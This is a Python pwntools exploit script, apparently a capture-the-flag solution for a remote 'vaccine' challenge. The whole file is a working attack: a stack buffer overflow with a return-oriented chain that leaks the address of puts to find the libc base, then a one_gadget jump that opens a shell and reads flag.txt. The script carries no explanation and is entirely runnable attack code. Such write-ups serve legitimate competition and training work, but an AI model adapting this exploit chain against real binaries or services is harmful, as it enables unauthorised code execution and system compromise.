from pwn import *

exe = ELF('./vaccine')
libc = ELF('./libc-2.31.so')

io = remote('vaccine.chal.ctf.acsc.asia', 1337)
#io = exe.process()
#gdb.attach(io, api=True)
#context.log_level = 'debug'

# Gadgets:
puts = 0x0000000000084420 # Offset that we took from the libc
pop_rdi = 0x0000000000401443
ret = 0x000000000040101a
main = 0x0000000000401236

# Leaking libc
io.recvuntil(b'vaccine:')
payload = b'\0'*264
payload += p64(pop_rdi) + p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(main)
io.sendline(payload)
print(io.recvuntil(b' reward: '))
print(io.recvuntil(b'\n'))
leak_puts = int.from_bytes(io.recvline(keepends=False), byteorder='little')
print(hex(leak_puts))
libc.address = leak_puts - puts
print(f'Libc base: {hex(libc.address)}')


one_gadget = 0xe3b01
payload = b'\0'*264
payload += p64(libc.address + one_gadget)
io.sendline(payload)
time.sleep(0.5)
io.sendline(b'cat flag.txt')
io.interactive()